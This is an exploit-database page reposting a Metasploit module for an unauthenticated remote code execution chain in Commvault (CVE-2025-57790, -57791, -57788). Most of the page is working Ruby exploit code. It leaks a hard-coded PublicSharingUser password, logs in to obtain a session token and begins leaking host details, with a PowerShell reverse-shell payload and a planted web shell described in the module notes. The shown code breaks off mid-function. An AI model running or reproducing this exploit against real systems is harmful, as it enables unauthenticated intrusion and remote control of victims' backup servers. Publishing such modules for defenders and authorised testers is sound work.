---
title: Commvault CLI Argument Injection / Traversal / Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2025090011
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-09-22
fetch_date: 2025-10-02T20:29:46.936876
---

# Commvault CLI Argument Injection / Traversal / Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Commvault CLI Argument Injection / Traversal / Remote Code Execution** **2025.09.21**  Credit:  **[Piotr Bazydlo](https://cxsecurity.com/author/Piotr%2BBazydlo/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
prepend Msf::Exploit::Remote::AutoCheck
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::FileDropper
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Commvault Command-Line Argument Injection to Traversal Remote Code Execution',
'Description' => %q{
This module exploits an unauthenticated remote code execution exploit chain for Commvault,
tracked as CVE-2025-57790 and CVE-2025-57791. A command-line injection permits unauthenticated
access to the 'localadmin' account, which then facilitates code execution via expression
language injection. CVE-2025-57788 is also leveraged to leak the target host name, which is
necessary knowledge to exploit the remote code execution chain. This module executes in
the context of 'NETWORK SERVICE' on Windows.
},
'License' => MSF\_LICENSE,
'Author' => [
'Sonny Macdonald', # Original discovery
'Piotr Bazydlo', # Original discovery
'remmons-r7' # MSF exploit
],
'References' => [
['CVE', '2025-57790'],
['CVE', '2025-57791'],
['CVE', '2025-57788'],
# Argument injection advisory
['URL', 'https://documentation.commvault.com/securityadvisories/CV\_2025\_08\_1.html'],
# Path traversal advisory
['URL', 'https://documentation.commvault.com/securityadvisories/CV\_2025\_08\_2.html'],
# Non-blind expression language payload (from an Ivanti EPMM exploit chain)
['URL', 'https://blog.eclecticiq.com/china-nexus-threat-actor-actively-exploiting-ivanti-endpoint-manager-mobile-cve-2025-4428-vulnerability']
],
'DisclosureDate' => '2025-08-19',
# Runs as the 'NETWORK SERVICE' user on Windows
'Privileged' => false,
# Although Linux installations are also affected, I didn't establish a reliable full path leak on the older Linux version I tested
'Platform' => ['windows'],
'Arch' => [ARCH\_CMD],
'DefaultTarget' => 0,
'Targets' => [
[
'Default', {
'DefaultOptions' => {
'PAYLOAD' => 'cmd/windows/powershell\_reverse\_tcp',
'SSL' => true
},
'Payload' => {
# The ampersand character isn't properly embedded in payloads sent to the web API, so use a base64 PowerShell command instead
'BadChars' => '&'
}
}
]
],
'Notes' => {
# Confirmed to work multiple times in a row
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
# The log files will contain IOCs, including the written web shell path
# If successful, an abnormal XML file and web shell will be written to disk (will attempt automatic cleanup of JSP file)
# The localadmin user's description will be updated to include the expression language payload (although this should be reverted)
'SideEffects' => [IOC\_IN\_LOGS, ARTIFACTS\_ON\_DISK, CONFIG\_CHANGES]
}
)
)
register\_options(
[
Opt::RPORT(443),
OptString.new('TARGETURI', [true, 'The base path to Commvault', '/'])
]
)
end
def check
# Query an unauthenticated web API endpoint to attempt to extract the PublicSharingUser GUID password
res = check\_commvault\_info
return CheckCode::Unknown('Failed to get a response from the target') unless res
# If the response body contains "cv-gorkha", we assume it's Commvault
if res.code == 200 && res.body.include?('cv-gorkha')
vprint\_status('The server returned a body that included the string cv-gorkha, looks like Commvault')
regex = /"cv-gorkha\\":\\"([a-zA-Z0-9-]+)\\"/
sharinguser\_pass = res.body.scan(regex)[0][0]
# If the regex fails to extract the GUID, we return Safe
if sharinguser\_pass.blank?
return CheckCode::Safe('The target returned an unexpected response that did not contain the desired GUID')
end
vprint\_good("Fetched GUID: #{sharinguser\_pass}")
vprint\_status('Attempting to login as PublicSharingUser')
res = login\_as\_publicsharinguser(sharinguser\_pass)
return CheckCode::Unknown('Failed to get a response from the target') unless res
if res.code != 200
CheckCode::Detected('Commvault detected, login as PublicSharingUser failed because a non-200 status was returned')
end
# Extract the token from the login response
regex = /(QSDK [a-zA-Z0-9]+)/
psu\_token = res.body.scan(regex)[0][0]
if psu\_token.blank?
CheckCode::Detected('Commvault detected, login as PublicSharingUser failed because no token was returned')
else
vprint\_good("Authenticated as PublicSharingUser, got token: #{psu\_token}")
return CheckCode::Vulnerable('Successfully authenticated as PublicSharingUser')
end
else
return CheckCode::Safe('The target server did not provide a response with the expected password leak')
end
end
def check\_commvault\_info
vprint\_status('Attempting to query the publicLink.do endpoint')
send\_request\_cgi(
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'commandcenter', 'publicLink.do')
)
end
def leak\_target\_info
# The 'activeMQConnectionURL' leak depicted in the finder blog post is not present on many systems by default
# CVE-2025-57788 can be exploited to access an authenticated web API endpoint that leaks host name and OS info
psu\_pass = extract\_publicsharinguser\_pass
vprint\_status("Attempting PublicServiceUser login using: #{psu\_pass}")
res = login\_as\_publicsharinguser(psu\_pass)
fail\_with(Failure::Unknown, 'Failed to get a response from the target') unless res
if res.code != 200
fail\_with(Failure::NotVulnerable, 'Login as PublicSharingUser failed (non-200 status), the target is likely not vulnerable')
end
# Extract the token from the login response
regex = /(QSDK [a-zA-Z0-9]+)/
psu\_token = res.body.scan(regex)[0][0]
if psu\_token.blank?
fail\_with(Failure::NotVulnerable, 'Login as PublicSharingUser failed (no token returned), the target is likely not vulnerable')
end
vprint\_good("Authenticated as PublicSharingUser, got token: #{psu\_token}")
res = get\_host\_info(psu\_token)
fail\_with(Failure::Unknown, 'Failed to get a r...